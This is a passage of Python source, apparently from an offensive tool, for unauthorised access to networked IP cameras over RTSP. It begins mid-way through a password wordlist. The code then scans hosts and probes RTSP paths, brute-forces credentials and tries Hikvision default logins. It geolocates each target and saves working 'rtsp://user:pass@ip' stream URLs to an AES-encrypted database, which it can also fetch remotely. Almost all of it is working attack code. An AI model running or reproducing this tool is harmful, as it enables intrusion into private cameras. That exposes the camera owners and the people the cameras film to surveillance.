'Wisdom123', '12345mul', '1130542145', 'cbcmesa1991', 'Agis12345', 'Pass2021', 'doomsheek123', 'Chevynova63', 'til848484', '12qwaszx', 'Kale2018', 'kjs09330657', 'Secam0204', 'Admin1122', 'Errasfa1967', 'Mauricio2024', 'Abc12345', 'Fuck0ff', 'Hq3M41wOpXvIeZh', '123456789asd.', '447', 'Mo1122da', 'kry888888', 'p1wHe3IOXZhM4qv', 'ts1661-0856', 'Yosi3746', 'Kostek15071983', 'aguila', 'e779977e', 'Aa118520', 'Z12345678r', 'mlargnif119', 'Mrcbkc918', '4MIvH1hZpOXeq3w', '4Xwp3MIevH1ZqhO', 'Arafat', 'Admin531706', 'Thomas---1974', 'Frankel9900', 'Aerial1964', 'bmmzlx88', 'Madona2025--', 'Arcomm10', '1234567b', 'Proline251', 'str01985', 'qasir2013', 'Qazaq777$', 'Hodas', 'pwXvIMhe4H13ZqO', 'watchme9992', 'ABC', 'dVS8o0s1]0', 'ihnmedia6136', 'anaKin', 'SARA6077', 'Qwer', 'Cea2024', 'Fa500270Aa']
 
    def filter_ips(self, ips):
        log.info("Filtering cameras...")
        alive = []
        def parse_ip_port(ip_str):
            if ':' in ip_str:
                ip, port = ip_str.split(':', 1)
                return ip, int(port)
            return ip_str, 554

        with ThreadPoolExecutor(max_workers=5) as pool:
            future_to_ip = {}
            for ip_str in ips:
                ip, port = parse_ip_port(ip_str)
                future = pool.submit(self.options_no_auth, ip, port)
                future_to_ip[future] = ip_str   

            for future in as_completed(future_to_ip):
                ip_str = future_to_ip[future]
                res = future.result()
                if res:
                    log.info(f"Camera detected: [\033[33m{ip_str}\033[0m]")
                    alive.append(ip_str)

        return alive


    def aes_encrypt(self,data: str) -> bytes:
        cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
        return cipher.encrypt(pad(data.encode('utf-8'), AES.block_size))
    
    def aes_decrypt(self,encrypted: bytes) -> str:
        cipher = AES.new(self.KEY, AES.MODE_CBC, self.IV)
        return unpad(cipher.decrypt(encrypted), AES.block_size).decode('utf-8') 
    
 
    def get_LocalDB_data(self,path_file:str):
        data = []
        try:
            with open(path_file, 'rb') as f:
                for l in f.read().split(self.SEP):
                    if not l:   
                        continue
                    data.append(json.loads(self.aes_decrypt(l)))
        except Exception as e:
            log.error("Failed to load local data...")
            return 
        return data

 
    def get_DB_data(self,url:str):
        data = []
        if not url:
            url = self.DB
        try:
            enc = requests.get(url,verify=False,timeout=5).content
            
            for l in enc.split(self.SEP):
                if not l:   
                        continue
                data.append(json.loads(self.aes_decrypt(l)))
        except Exception as e:
            log.error("Unable to update data, please check your network connection...")
            return False
        else:
            return data
    
    def merge_all_bc(self, src_dir="./data"):
        merged = {}

        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        out_file = f"./data/{ts}.bc"

        if os.path.exists(out_file):
            os.remove(out_file)

        total_read = 0  

        for name in os.listdir(src_dir):
            if not name.endswith(".bc"):
                continue

            path = os.path.join(src_dir, name)

            records = self.get_LocalDB_data(path)
            count = len(records) if records else 0
            total_read += count

            log.info(f"Adding {path} to merge buffer... {count} records")

            if not records:
                continue

            for item in records:
                rtsp = item.get("rtsp")
                data = item.get("data")

                if not rtsp or not data:
                    continue

 
                if rtsp not in merged:
                    merged[rtsp] = data

        log.warning(
            f"Saving as new {ts}.bc  Estimated merged records: {len(merged)}"
        )

        for rtsp, data in merged.items():
            self.save_info(rtsp, data, out_file)

        log.success(f"Successfully merged and updated data to {out_file}")

    def save_info(self, rtsp_url: str, ip_data: str,path_file:str,ver=None):
        record = {
            "rtsp": rtsp_url,
            "data": ip_data
        }
        try:
            with open(path_file , 'ab') as f:
                data = json.dumps(record, ensure_ascii=False)
                bin_data = self.aes_encrypt(data)  
                f.write(bin_data+self.SEP)
        except Exception as e:
            log.error("Failed to save results, check permissions or if the file exists...")
        else:
            if ver:
                log.info(f"Results successfully appended to: [\033[33m{path_file}\033[0m]")


    def ping_live(self, file_path):

        def extract_ip(rtsp):
            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
            return match.group(1) if match else None

        def ping_ip(ip, timeout=1):
            system = platform.system().lower()

            if system == "windows":
                cmd = ["ping", "-n", "1", "-w", str(timeout * 1000), ip]
            else:
                cmd = ["ping", "-c", "1", "-W", str(timeout), ip]

            result = subprocess.run(
                cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )

            return result.returncode == 0

        log.info("Probing reachable cameras from bc file...")

        data = self.get_LocalDB_data(file_path)

        timestamp = time.strftime("%Y%m%d_%H%M%S")
        save_filename = f"live_{timestamp}.bc"

        for info in data:
            rtsp_url = info.get("rtsp")
            if not rtsp_url:
                continue

            ip = extract_ip(rtsp_url)
            if not ip:
                continue

            if ping_ip(ip, timeout=1):
                log.success(f"[{ip}] Host is alive")

                ip_data = self.show_location(ip)

                self.save_info(rtsp_url, ip_data, save_filename, True)

            else:
                log.warning(f"[{ip}] No response")



    def hiv(self,ip:str,port=554,password=''):
        def extract_ip(rtsp):
            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
            return match.group(1) if match else None
        # Only public global.bc data
        data = self.get_LocalDB_data(self.LOCAL_DB)
        if not data:
            data = []
        ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
        if ip in ip_set:
            log.warning(f"[{ip}] This IP has already been recorded...",ip)
            return 0
        path = self.PATH[0]
        auth_bloodcat = self.b64('admin', password)
        resp = self.describe_path(ip, port, path, auth_bloodcat)
        code = self.status(resp)
        if code in (200, 403):
            ip_data = self.show_location(ip)
            rtsp_url = f"rtsp://admin:{password}@{ip}:{port}{path}"
            log.success(f"Hikvision RTSP PLAY ：[\033[5m{rtsp_url}]",rtsp_url)
            self.save_info(rtsp_url,ip_data,self.LOCAL_DB,True)
        else:
            log.warning(f"Hikvision camera unreachable (likely firewall-blocked, verify via web service): [admin:{password}@{ip}:{port}]")
 


    def run(self, ip: str, port=554, password=''):

        def extract_ip(rtsp):
            match = re.match(r'rtsp://.*?@([\d.]+):\d+/', rtsp)
            return match.group(1) if match else None

 
        if password:
            self.PASSWORD = [password]
            log.info(f"Currently entering password spraying : Try Password => [{password}]", f"{password}")

        ip_data = self.show_location(ip)

        def _probe_and_auth(db_path, scope_log_msg):
            log.info(scope_log_msg)
            data = self.get_LocalDB_data(db_path)
            if not data:
                data = []

            ip_set = {extract_ip(r['rtsp']) for r in data if r.get('rtsp')}
            if ip in ip_set:
                log.warning("This IP has already been recorded...")
                return 0

 
            resp = self.options_no_auth(ip, port)
            code = self.status(resp)
            if code is None:
                log.warning("Partial fingerprint match (50%): no response from target")
            elif code == 200:
                log.info("Full fingerprint match (100%): resource accessible without authentication")
            elif code == 401:
                log.info("Full fingerprint match (100%): authentication required")
            elif code == 403:
                log.info("Full fingerprint match (100%): access explicitly forbidden")
            elif code in (404, 454):
                log.info("Full fingerprint match (100%): URI ignored")

            log.info(f"Probing paths using credentials [{self.default_user}:{self.default_password}]...", f"{self.default_user}:{self.default_password}")
            auth_bloodcat = self.b64(self.default_user, self.default_password)

            paths_with_401 = []
            paths_no_auth = []

            for path in self.PATH:
                resp = self.describe_path(ip, port, path, auth_bloodcat)
                code = self.status(resp)
                if code == 401:
                    log.info(f"Path [{path}] exists, proceeding with credential brute-force...", f"{path}")
                    paths_with_401.append(path)
                    break
                elif code == 200:
                    log.info(f"Path [{path}] exists and is accessible without authentication!", f"{path}")
                    paths_no_auth.append(path)
                    break
                elif code == 404 or code == 400:
                    log.info(f"Path [{path}] does not exist", f"{path}")
                else:
                    log.warning(f"Target returned an unexpected response: [{code}] , please try again later...", f"{code}")
                time.sleep(0.2)

            if paths_no_auth:
                rtsp_url = f"rtsp://{self.default_user}:{self.default_password}@{ip}:{port}{paths_no_auth[0]}"
                log.success(f"RTSP PLAY  ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
                self.save_info(rtsp_url, ip_data, db_path, True)
                return 1

 
            if not paths_with_401:
                paths_with_401 = [self.PATH[0]]

            valid_creds = []
            target_path = paths_with_401[0]

            log.info(f"witching to path: [{target_path}], attempting to retrieve credentials...", f"{target_path}")
            for u in self.USER:
                for p in self.PASSWORD:
                    auth = self.b64(u, p)
                    if target_path:
                        resp = self.describe_path(ip, port, target_path, auth)
                    else:
                        resp = self.describe_root(ip, port, auth)
                    code = self.status(resp)
                    if code in (200, 403):
                        print()
                        log.info(f"Found credentials : [{u}:{p}]", f"{u}:{p}")
                       
                        rtsp_url = f"rtsp://{u}:{p}@{ip}:{port}{path}" if 'path' in locals() and path else f"rtsp://{u}:{p}@{ip}:{port}{target_path}"
                        log.success(f"RTSP PLAY ：[\033[5m{rtsp_url}]", f"{rtsp_url}")
                        self.save_info(rtsp_url, ip_data, db_path, True)
                        return 1
                    else:
                        sys.stdout.write(f"\r☕ ➣ Attempting credentials : [{u}:{p}]\x1b[K")
                        sys.stdout.flush()
                    time.sleep(0.2)
            else:
                print()
                log.warning("No valid credentials found")

            return None
 
        if 'lan' in ip_data:
            res = _probe_and_auth(self.LOCAL_LAN_DB, "Detected that the current target is located within a local network...")
            if res is not None:
                return res
        elif 'country' in ip_data:
            res = _probe_and_auth(self.LOCAL_DB, "Detected that the current target is located on the public network...")
            if res is not None:
                return res
        else:
            log.error("Failed to retrieve IP information.")
            return 0

        return 2

    
    def show_location(self,ip:str):
        def check_ip_type(ip: str) -> int:
            ipv4_pattern = re.compile(r'^((25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)\.){3}(25[0-5]|2[0-4]\d|1\d{2}|[1-9]?\d)$')
            private_pattern = re.compile(r'^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)')
            if not ipv4_pattern.match(ip):
                return 3  
            elif private_pattern.match(ip):
                return 2 
            else:
                return 1
        code = check_ip_type(ip)
        if code == 2:
            data = {
                'lan':ip
            }
            return data
        elif code == 1:
            location_ = Location()
            data = location_.get(ip)
            show = f'''\033[33m==========================================
IP:{ip}
Country: {data['country']}
City: {data['city']}
Lat&Lng: {data['lalo']}
ASN: {data['asn']}
ISP/Org: {data['sys_org']}
Network Range: {data['network']}
===========================================\033[0m'''
            print(show)
            location_.close()
            return data
        return False
        

    def send(self,req, ip, port):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(self.TIMEOUT)
        try:
            s.connect((ip, port))
            s.sendall(req.encode())
            data = s.recv(8192)
            return data.decode(errors="ignore")
        except Exception:
            return None
        finally:
            s.close()

    def describe_path(self,ip, port, path, auth=None):
        hdr = ""
        if auth:
            hdr = f"Authorization: Basic {auth}\r\n"
        ua = self.random_ua()
        req = (
            f"DESCRIBE rtsp://{ip}:{port}{path} RTSP/1.0\r\n"
            f"CSeq: 3\r\n"
            f"Accept: application/sdp\r\n"
            f"User-Agent: {ua}\r\n"
            f"{hdr}\r\n"
        )

        return self.send(req, ip, port)

    def random_ua(self):
        return random.choice(self.USER_AGENTS)

    def status(self,resp):
        if not resp:
            return None
        try:
            return int(resp.splitlines()[0].split()[1])
        except Exception:
            return None

    def b64(self,user, pwd):
        return base64.b64encode(f"{user}:{pwd}".encode()).decode()
    
    def options_no_auth(self, ip, port):
 
        ua = self.random_ua()
        req = (
            f"OPTIONS rtsp://{ip}:{port}/ RTSP/1.0\r\n"
            f"CSeq: 1\r\n"
            f"User-Agent: {ua}\r\n\r\n"
        )

        data = self.send(req, ip, port)
        if not isinstance(data, str):
            log.warning("No response received, please try again later...")
            return data 
        m = re.search(r'(?im)^Server:\s*([^\r\n]+)', data)
        if m:
            log.info(f"Service detected: [{m.group(1)}]",f"{m.group(1)}")
        return data

    def check_update(current_version: str, update_url: str, timeout: int = 5):
        try:
            resp = requests.get(update_url, timeout=timeout)
            resp.raise_for_status()
            data = resp.json()
            remote_version = data.get("version")
            mandatory = data.get("mandatory", False)
            download_url = data.get("download_url")
            file_hash = data.get("hash")

            if not remote_version:
                return {"status": "error", "reason": "Invalid update config"}

            if version.parse(remote_version) > version.parse(current_version):
                return {
                    "status": "update_available",
                    "current_version": current_version,
                    "remote_version": remote_version,
                    "mandatory": mandatory,
                    "download_url": download_url,
                    "hash": file_hash
                }

            return {
                "status": "up_to_date",
                "current_version": current_version
            }

        except Exception as e:
            return {
                "status": "error",
                "reason": str(e)
            }
